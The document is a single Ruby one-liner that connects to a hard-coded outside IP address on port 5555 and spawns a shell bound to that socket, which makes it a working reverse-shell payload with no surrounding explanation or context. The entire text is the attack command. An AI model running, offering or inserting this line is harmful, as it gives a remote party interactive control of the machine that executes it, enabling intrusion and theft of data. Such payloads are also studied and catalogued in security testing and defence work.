ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("88.225.219.22",5555))'
